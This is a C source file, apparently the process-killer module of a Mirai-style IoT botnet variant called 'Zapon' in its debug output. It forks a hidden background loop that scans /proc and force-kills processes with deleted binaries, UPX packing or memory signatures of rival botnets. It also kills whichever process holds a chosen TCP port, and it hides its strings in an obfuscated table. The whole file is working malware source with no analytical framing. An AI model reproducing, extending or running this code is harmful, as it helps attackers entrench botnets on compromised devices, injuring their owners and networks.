#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "headers/includes.h"
#include "headers/killer.h"
#include "headers/table.h"
#include "headers/util.h"

int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    // Let parent continue on main thread
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;


    // In case the binary is getting deleted, we want to get the REAL realpath
    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

#ifdef DEBUG
    printf("[killer] Zappon setting up proc scan\n");
#endif

    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
#ifdef DEBUG
            printf("[killer] Failed to open /proc!\n");
#endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            char maps_path[64], *ptr_maps_path = maps_path;
            int rp_len, fd, pid = atoi(file->d_name);

            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                {
#ifdef DEBUG
                    printf("[killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
#endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1); // Sleep so we can wait for another process to spawn
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_EXE);

            // Store /proc/$pid/exe into exe_path
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));


            // Store /proc/$pid/maps into maps_path
            ptr_maps_path += util_strcpy(ptr_maps_path, "/proc/");
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, "/smaps");

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_EXE);

            // Resolve exe_path (/proc/$pid/exe) -> realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef DEBUG
                    printf("[Zapon] Deleted binary for [%s >> %d]\n", realpath, pid);
#endif
                    kill(pid, 9);
                }
                close(fd);
            }

            /*if (memory_scan_match(exe_path))
            {
#ifdef DEBUG
                printf("[killer] Memory scan match for binary [%s >> %d]\n", realpath, pid);
#endif
                kill(pid, 9);
            } 
        */
            if (Hajimari_scan_match(maps_path))
            {
#ifdef DEBUG
                printf("[Zapon] Found one of switch his sources [%s >> %d]\n", realpath, pid);
#endif
                kill(pid, 9);
            } 

            if (upx_scan_match(exe_path))
            {
#ifdef DEBUG
                printf("[Zapon] Found UPX in binary [%s >> %d]\n", realpath, pid);
#endif
                kill(pid, 9);
            } 



            /*
            if (upx_scan_match(exe_path, status_path))
            {
#ifdef DEBUG
                printf("[killer] UPX scan match for binary %s\n", exe_path);
#endif
                kill(pid, 9);
            }
            */

            // Don't let others memory scan!!!
            util_zero(exe_path, sizeof (exe_path));
            util_zero(maps_path, sizeof (maps_path));

            //sleep(1);
        }

        closedir(dir);
    }

#ifdef DEBUG
    printf("[killer] Finished\n");
#endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
	table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
		table_lock_val(TABLE_KILLER_TCP);

        return 0;
    }

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
#ifdef DEBUG
                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
#else
                        kill(util_atoi(pid, 10), 9);
#endif
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}

static BOOL memory_scan_match(char *path)
{
    char rdbuf[512];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_ASSWORD);
	table_unlock_val(TABLE_MEM_ROUTE);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_ASSWORD, NULL), util_strlen(table_retrieve_val(TABLE_MEM_ASSWORD, NULL))) ||
			mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_ROUTE, NULL), util_strlen(table_retrieve_val(TABLE_MEM_ROUTE, NULL))))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_MEM_ASSWORD);
	table_lock_val(TABLE_MEM_ROUTE);

    close(fd);

    return found;
}
static BOOL upx_scan_match(char *path)
{
    char rdbuf[512];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_UPX);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_UPX, NULL), util_strlen(table_retrieve_val(TABLE_MEM_UPX, NULL))))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_MEM_UPX);
    close(fd);

    return found;
}

static BOOL Hajimari_scan_match(char *path)
{
    char rdbuf[512];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_ORPHIC);
    table_unlock_val(TABLE_MEM_HORIZON);
    table_unlock_val(TABLE_MEM_YAKUZA);
    table_unlock_val(TABLE_MEM_YAGI);
    table_unlock_val(TABLE_MEM_FURASSHU);
    table_unlock_val(TABLE_MEM_KALON);

    table_unlock_val(TABLE_MEM_HORIZON2);
    table_unlock_val(TABLE_MEM_KALON2);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_ORPHIC, NULL), util_strlen(table_retrieve_val(TABLE_MEM_ORPHIC, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_KALON, NULL), util_strlen(table_retrieve_val(TABLE_MEM_KALON, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_YAGI, NULL), util_strlen(table_retrieve_val(TABLE_MEM_YAGI, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_YAKUZA, NULL), util_strlen(table_retrieve_val(TABLE_MEM_YAKUZA, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_FURASSHU, NULL), util_strlen(table_retrieve_val(TABLE_MEM_FURASSHU, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_HORIZON, NULL), util_strlen(table_retrieve_val(TABLE_MEM_HORIZON, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_KALON2, NULL), util_strlen(table_retrieve_val(TABLE_MEM_KALON2, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_HORIZON2, NULL), util_strlen(table_retrieve_val(TABLE_MEM_HORIZON2, NULL))))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_MEM_ORPHIC);
    table_lock_val(TABLE_MEM_HORIZON);
    table_lock_val(TABLE_MEM_YAKUZA);
    table_lock_val(TABLE_MEM_YAGI);
    table_lock_val(TABLE_MEM_FURASSHU);
    table_lock_val(TABLE_MEM_KALON);

    table_lock_val(TABLE_MEM_HORIZON2);
    table_lock_val(TABLE_MEM_KALON2);

    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
